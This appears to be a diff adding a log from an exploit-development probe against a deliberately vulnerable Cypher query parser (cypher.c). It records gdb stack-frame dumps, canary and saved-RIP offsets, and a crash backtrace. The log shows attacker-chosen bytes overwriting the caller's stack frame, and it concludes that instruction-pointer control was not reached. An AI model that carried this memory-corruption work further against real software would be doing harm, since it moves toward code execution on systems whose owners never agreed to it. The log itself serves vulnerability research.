@@ -1,0 +1,74 @@
+codebasememory2shell W12 higher-stride probe, 2026-11-24T22:05:52Z
+binary: /tmp/cbm-w12-far, pinned vulnerable cypher.c, same flags as build.sh plain target
+
+=== build ===
+build RC=0
+
+=== N=40, chosen value at item 39, all other properties empty ===
+ACTIVE=39 ITEMS=40 VALUE=MISHE-OO0123456789ABCDEF RC=0 ROWS=1 COLS=40 ERR=(none) QLEN=812
+
+=== gdb frame measurement (read-only) ===
+Breakpoint 1 at 0x17b79: file src/cypher/cypher.c, line 4118.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, execute_return_simple (rb=0x7fffffffe030, max_rows=100000, bind_count=1, bindings=<optimized out>, ret=0x5555557682c0) at src/cypher/cypher.c:4118
+4118	        rb_add_row(rb, vals);
+
+=== frame-relative state at the end of the projection loop ===
+callee_rbp=0x7fffffffdff0 canary(rbp-0x38)=0x7fffffffdfb8 func_bufs[39]=rbp+0x1c0=0x7fffffffe1b0
+0x7fffffffdfb8:	0x250af0c6ca67ac00
+0x7fffffffe1b0:	0x4f4f2d454853494d	0x3736353433323130
+0x7fffffffe1c0:	0x4645444342413938	0x0000000000000000
+0x7fffffffe1d0:	0x00005555556f6b30	0x00007ffff7ffd000
+0x7fffffffe1e0:	0xdf173715f283a995	0xdf17276f72a1a995
+0x7fffffffe1f0:	0x0000000000000000
+
+=== 63-byte value: chosen bytes cover the pointer-like words at rbp+0x1d0/+0x1d8 ===
+ACTIVE=39 ITEMS=40 VALUE=MISHE-OO0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz RC=0 ROWS=1 COLS=40 ERR=(none) QLEN=812
+=== gdb 63-byte frame measurement (read-only) ===
+Breakpoint 1 at 0x17b79: file src/cypher/cypher.c, line 4118.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, execute_return_simple (rb=0x7fffffffe000, max_rows=100000, bind_count=1, bindings=<optimized out>, ret=0x5555557682c0) at src/cypher/cypher.c:4118
+4118	        rb_add_row(rb, vals);
+
+=== 63-byte frame write ===
+callee_rbp=0x7fffffffdfc0 canary(rbp-0x38)=0x7fffffffdf88
+0x7fffffffdf88:	0x3741c91f15f8ef00
+0x7fffffffe180:	0x4f4f2d454853494d	0x3736353433323130
+0x7fffffffe190:	0x4645444342413938	0x4e4d4c4b4a494847
+0x7fffffffe1a0:	0x565554535251504f	0x646362615a595857
+0x7fffffffe1b0:	0x6c6b6a6968676665	0x74737271706f6e6d
+0x7fffffffe1c0:	0x00007a7978777675	0x0000000000000000
+0x7fffffffe1d0:	0x0000000000000000	0x000055555567e375
+0x7fffffffe1e0:	0x00007fffffffe270	0x3741c91f15f8ef00
+0x7fffffffe1f0:	0x00007fffffffe250	0x00007ffff7c2a28b
+The words at rbp+0x1d0/+0x1d8 held 0x5555.../0x7fff... with a 23-byte value
+and hold chosen ASCII with 63 bytes; the process still returns RC=0, so
+those caller-frame words are dead in this build. No live-pointer use shown.
+
+=== far stride: main saved RIP is at rbp+0x4198 in this build; item index ~1134 ===
+The parser grows ret->items without a width cap, but build_return_columns()
+fills only col_names[0..31] (cypher.c:4074) while rb_set_columns() reads
+cols[0..count-1] (cypher.c:2568). Large counts fault before the write loop.
+
+=== gdb backtrace of the far-stride fault ===
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Program received signal SIGSEGV, Segmentation fault.
+__strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
+warning: 76	../sysdeps/x86_64/multiarch/strlen-avx2.S: No such file or directory
+#0  __strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
+#1  0x0000555555564661 in heap_strdup (s=0x1 <error: Cannot access memory at address 0x1>) at src/cypher/cypher.c:51
+#2  0x0000555555564928 in rb_set_columns (rb=rb@entry=0x7fffffffe040, cols=cols@entry=0x7fffffff93c0, count=1135) at src/cypher/cypher.c:2568
+#3  0x000055555556ae48 in build_return_columns (ret=<optimized out>, rb=<optimized out>) at src/cypher/cypher.c:4095
+#4  execute_return_clause (rb=0x7fffffffe040, max_rows=100000, bind_count=1, bindings=0x7fffededf010, ret=0x555555786890, q=0x555555786720) at src/cypher/cypher.c:4382
+
+Conclusion: higher strides leave the execute_return_simple canary intact
+when the index-38 property is empty, so chosen bytes do reach the caller's
+frame while the process survives (caller query-text buffer, not a pointer).
+Ancestor saved RIPs are not reachable: the 32-element col_names read in
+rb_set_columns() faults first. No pointer/IP control, command or rung 5.
